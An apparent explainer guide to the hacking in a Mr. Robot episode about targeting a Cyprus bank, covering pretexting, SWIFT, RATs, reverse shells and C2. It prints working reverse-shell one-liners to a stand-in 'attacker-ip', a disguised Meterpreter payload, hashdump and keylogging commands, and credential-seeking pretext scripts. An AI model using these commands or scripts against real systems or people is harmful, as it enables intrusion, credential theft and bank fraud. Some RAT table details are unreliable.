# Episode 2: eps4.1_402paymentrequired.h

## Season 4, Episode 2 | "402 Payment Required"

**Air Date:** October 13, 2019
**Directed by:** Sam Esmail

### Overview

The episode title references HTTP status code 402, originally reserved for future use in digital payment systems. The irony is deliberate: Elliot is targeting the financial infrastructure that enables the Deus Group's power, specifically the Cyprus National Bank. This episode focuses heavily on financial system attacks, social engineering of bank employees, and establishing persistent remote access through RATs and reverse shells.

---

## Hacks & Techniques

### 1. HTTP 402 Payment Required Status Code

HTTP 402 was reserved in the original HTTP specification for future use with digital cash or micropayment systems. It was never formally standardized for general use, making it an apt metaphor for a financial system that operates outside normal rules.

- **Historical Context:** The code was intended for a digital payment ecosystem that never materialized in the way HTTP's designers envisioned.
- **Modern Usage:** Some APIs (Shopify, Stripe) use 402 to indicate payment-related failures, but it remains non-standard.
- **Thematic Relevance:** The Deus Group operates a parallel financial system that requires its own form of "payment" (compliance, loyalty, silence) for access.

### 2. Social Engineering of Bank Employees (Pretexting)

Elliot and his team employ pretexting, a social engineering technique where the attacker fabricates a scenario (pretext) to manipulate the target into performing actions or divulging information.

#### Pretexting Methodology

1. **Research Phase:** Gather information about the bank's organizational structure, employee names, internal jargon, and procedures through OSINT.
2. **Pretext Construction:** Develop a credible scenario, such as impersonating a senior bank officer, regulator, or IT vendor.
3. **Channel Selection:** Choose the most effective communication channel (phone call/vishing, email, in-person visit).
4. **Execution:** Engage the target with the fabricated scenario, using authority, urgency, and insider knowledge to establish credibility.
5. **Extraction:** Obtain the desired information (credentials, account details, internal system information) or action (installing software, granting access).

#### Common Bank Employee Pretexts

- **IT Support:** "We're performing an emergency system upgrade and need your login credentials to verify account migration."
- **Compliance/Audit:** "This is a regulatory audit; we need access to transaction records immediately."
- **Senior Management:** "The CEO needs these wire transfer details reviewed before a board meeting in 30 minutes."
- **Vendor/Third-Party:** "We're from the core banking platform vendor; we need remote access to diagnose a critical system issue."

### 3. Cyprus National Bank Targeting and Reconnaissance

The Cyprus National Bank represents a strategically chosen target due to its role in offshore banking and the Deus Group's financial operations.

#### Banking Infrastructure Reconnaissance

- **Public Financial Disclosures:** Annual reports, regulatory filings, and audit statements reveal technology stack and vendor relationships.
- **Job Postings:** Bank IT job listings often reveal specific technologies, software platforms, and certifications required, exposing the internal tech stack.
- **DNS and Network Reconnaissance:** Identifying mail servers, web applications, VPN endpoints, and remote access portals.
- **SWIFT Membership:** Identifying the bank's SWIFT BIC (Bank Identifier Code) to understand its position in the interbank messaging network.

#### Attack Surface Mapping

```
External Attack Surface:
+------------------+     +------------------+     +------------------+
| Public Website   |     | Online Banking   |     | SWIFT Gateway    |
| (Info Disclosure)|     | (Web App Vulns)  |     | (Core Target)    |
+------------------+     +------------------+     +------------------+
         |                        |                        |
+------------------+     +------------------+     +------------------+
| Email Gateway    |     | VPN Endpoint     |     | ATM Network      |
| (Phishing Entry) |     | (Remote Access)  |     | (Lateral Move)   |
+------------------+     +------------------+     +------------------+
```

### 4. SWIFT Network Infrastructure Analysis

SWIFT (Society for Worldwide Interbank Financial Telecommunication) is the backbone of international financial messaging. Understanding its architecture is central to the episode's plot.

#### SWIFT Architecture Components

- **SWIFTNet:** The IP-based messaging network connecting over 11,000 financial institutions globally.
- **SWIFT Alliance Access (SAA):** The messaging interface software installed at member institutions.
- **SWIFT Alliance Lite2:** A cloud-based alternative for smaller institutions.
- **FIN Messages:** The standard message types used for financial transactions:
  - **MT103:** Single customer credit transfer (wire transfer)
  - **MT202:** Bank-to-bank transfer
  - **MT199/MT299:** Free-format messages between banks
  - **MT940:** Customer statement message

#### SWIFT Customer Security Programme (CSP)

Post-Bangladesh Bank heist, SWIFT implemented mandatory security controls:

- Restrict internet access from the SWIFT secure zone
- Reduce attack surface and vulnerabilities
- Physically secure the SWIFT environment
- Prevent compromise of credentials
- Detect anomalous activity and respond to incidents

### 5. RAT (Remote Access Trojan) Deployment

Once initial access is obtained, the team deploys a Remote Access Trojan for persistent, covert access to bank systems.

#### RAT Capabilities

- **Remote Desktop Control:** Full GUI access to the compromised system
- **Keylogging:** Capturing all keystrokes including credentials
- **File Management:** Upload, download, and execute files remotely
- **Screen Capture:** Periodic screenshots of user activity
- **Webcam/Microphone Access:** Audio and video surveillance
- **Credential Harvesting:** Extracting saved passwords and tokens
- **Lateral Movement:** Using the compromised system as a pivot point

#### Common RAT Families (Reference)

| RAT | Origin | Notable Features |
|---|---|---|
| **Poison Ivy** | Open source | Classic RAT with full feature set |
| **DarkComet** | Open source | Widely used, modular architecture |
| **Quasar RAT** | Open source (.NET) | Legitimate remote admin tool repurposed |
| **njRAT** | Underground | Popular in Middle Eastern threat campaigns |
| **Cobalt Strike Beacon** | Commercial (Red Team) | Industry-standard C2 implant |

### 6. Reverse Shells and C2 Infrastructure

The episode depicts the establishment of command-and-control (C2) infrastructure to maintain persistent access to compromised bank systems.

#### Reverse Shell Concept

Unlike a traditional (bind) shell that listens for incoming connections, a reverse shell initiates an outbound connection from the target to the attacker. This bypasses firewalls that block inbound connections but allow outbound traffic.

```
Traditional Shell:
Attacker --[connect]--> Target:4444 (BLOCKED by firewall)

Reverse Shell:
Target --[connect]--> Attacker:4444 (ALLOWED as outbound)
```

#### C2 Infrastructure Architecture

```
+----------------+     +----------------+     +----------------+
|  Operator      |---->|  Redirector    |---->|  Team Server   |
|  (Elliot)      |     |  (Cloud VPS)   |     |  (C2 Server)   |
+----------------+     +----------------+     +----------------+
                                                      |
                              +------------------------+
                              |                        |
                       +------v------+          +------v------+
                       |  Bank PC #1 |          |  Bank PC #2 |
                       |  (Beacon)   |          |  (Beacon)   |
                       +-------------+          +-------------+
```

#### C2 Communication Channels

- **HTTP/HTTPS:** Blends with normal web traffic; uses malleable C2 profiles to mimic legitimate websites.
- **DNS:** Encodes data in DNS queries and responses; extremely slow but very stealthy.
- **SMB Named Pipes:** For internal lateral movement without generating network traffic that crosses the perimeter.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Cobalt Strike** | Commercial adversary simulation and C2 framework |
| **Metasploit Framework** | Exploitation and post-exploitation with Meterpreter payloads |
| **Empire (PowerShell)** | Post-exploitation agent for Windows environments |
| **Nmap** | Network scanning and service enumeration of bank infrastructure |
| **Burp Suite** | Web application testing against online banking portals |
| **SET (Social-Engineer Toolkit)** | Automated pretexting and phishing attack generation |
| **Responder** | LLMNR/NBT-NS poisoning for credential capture on internal networks |

---

## Commands Shown

### Reverse Shell Examples

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell reverse shell (common in banking environments)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Metasploit C2 Setup

```bash
# Generate a Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker-ip LPORT=443 -f exe -o update.exe

# Start the handler
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 443
msf6 > exploit -j

# Post-exploitation commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > keyscan_start
meterpreter > screenshot
```

### Network Reconnaissance of Banking Infrastructure

```bash
# Scan for SWIFT-related services
nmap -sV -p 443,8443,48000-48100 --script ssl-enum-ciphers cyprus-bank-range/24

# Identify web applications
nikto -h https://onlinebanking.cyprusnationalbank.com

# DNS enumeration
dig +short mx cyprusnationalbank.com
dig +short ns cyprusnationalbank.com
dnsrecon -d cyprusnationalbank.com -t std
```

### SWIFT Message Format Reference (MT103)

```
{1:F01CYPRBANKAXXX0000000000}
{2:O1031300200101SENDERBANKAXXX00000000002001011300N}
{4:
:20:PAYMENT-REF-001
:23B:CRED
:32A:200101EUR1000000,00
:50K:/DE89370400440532013000
SENDER NAME
ADDRESS LINE 1
:59:/CY17002001280000001200527600
RECIPIENT NAME
ADDRESS LINE 1
:71A:OUR
-}
```

---

## Real-World Parallels

### Bangladesh Bank Heist (2016)

The most significant real-world parallel for this episode is the Bangladesh Bank heist:

- **Attack Vector:** Attackers (attributed to Lazarus Group/North Korea) compromised Bangladesh Bank's SWIFT terminal through spear-phishing emails.
- **Method:** They used the bank's own SWIFT credentials to send fraudulent MT103 transfer requests totaling $951 million to accounts in the Philippines and Sri Lanka.
- **Outcome:** $81 million was successfully transferred before a spelling error in one transfer request ("fandation" instead of "foundation") triggered a review that halted the remaining transfers.
- **Lessons:** The attack exposed fundamental weaknesses in how banks trusted their SWIFT environments and the lack of transaction monitoring.

### Carbanak/FIN7 Banking Attacks

The Carbanak group targeted over 100 banks worldwide:

- Used spear-phishing to deploy RATs on bank employee workstations.
- Studied internal operations over months via screen recording and keylogging.
- Manipulated SWIFT terminals, ATM controllers, and internal transfer systems.
- Stole an estimated $1 billion over a 2-year campaign.

### Cyprus Banking Crisis (2013)

The choice of Cyprus as the target bank's location is a deliberate reference:

- In 2013, Cyprus faced a financial crisis that led to a controversial "bail-in" where deposits over EUR 100,000 were partially confiscated.
- Cyprus was known as a haven for Russian oligarch money and offshore banking.
- The crisis exposed the fragility of banking systems and the concentration of illicit wealth.

### Social Engineering in Financial Sector

- **Ubiquiti Networks (2015):** Employees were tricked via social engineering into transferring $46.7 million to overseas accounts controlled by attackers.
- **FACC (2016):** The Austrian aerospace company lost EUR 50 million when an employee was deceived by emails impersonating the CEO (Business Email Compromise).

## Tool Links

- [Cobalt Strike](https://www.cobaltstrike.com/) - Adversary simulation and C2 framework
- [Metasploit](https://www.metasploit.com/) - Exploitation and post-exploitation framework
- [Nmap](https://nmap.org/) - Network scanning and banking service enumeration
- [SET (Social Engineering Toolkit)](https://github.com/trustedsec/social-engineer-toolkit) - Automated pretexting and phishing attack generation
- [Impacket](https://github.com/fortra/impacket) - Python tools for lateral movement
- [Wireshark](https://www.wireshark.org/) - Network traffic analysis
- [Shodan](https://www.shodan.io/) - Internet-exposed device discovery

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Social engineering of bank employees (pretexting) | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| SWIFT infrastructure reconnaissance | T1595 | Active Scanning | https://attack.mitre.org/techniques/T1595/ |
| RAT deployment for persistent access | T1219 | Remote Access Software | https://attack.mitre.org/techniques/T1219/ |
| Reverse shells and C2 infrastructure | T1071 | Application Layer Protocol | https://attack.mitre.org/techniques/T1071/ |
| C2 communication via HTTPS | T1573 | Encrypted Channel | https://attack.mitre.org/techniques/T1573/ |
| Keylogging via RAT | T1056 | Input Capture | https://attack.mitre.org/techniques/T1056/ |
| Local system data collection | T1005 | Data from Local System | https://attack.mitre.org/techniques/T1005/ |
| Script and command execution | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Meterpreter payload generation and transfer | T1105 | Ingress Tool Transfer | https://attack.mitre.org/techniques/T1105/ |

## References and Further Reading

- Bangladesh Bank Heist (2016) - Technical analysis of the $81 million theft via SWIFT
- SWIFT Customer Security Programme (CSP): https://www.swift.com/myswift/customer-security-programme-csp
- Carbanak/FIN7 APT Group - Kaspersky Lab Report on bank attacks
- Ubiquiti Networks Social Engineering Fraud (2015) - $46.7 million loss
- SWIFT MT103 Message Format - ISO 15022 Standard Documentation
- Cyprus Banking Crisis (2013) - Bail-in and offshore banking system fragility
- Cobalt Strike Documentation: https://www.cobaltstrike.com/help-beacon
- FACC CEO Fraud (2016) - EUR 50 million loss via Business Email Compromise

## Search Tags

```
tags: [cobalt-strike, metasploit, nmap, SET, impacket, SWIFT, RAT, reverse-shell, C2, pretexting, social-engineering, banking-attack, meterpreter]
season: 4
episode: 2
mitre: [T1566, T1595, T1219, T1071, T1573, T1056, T1005, T1059, T1105]
```
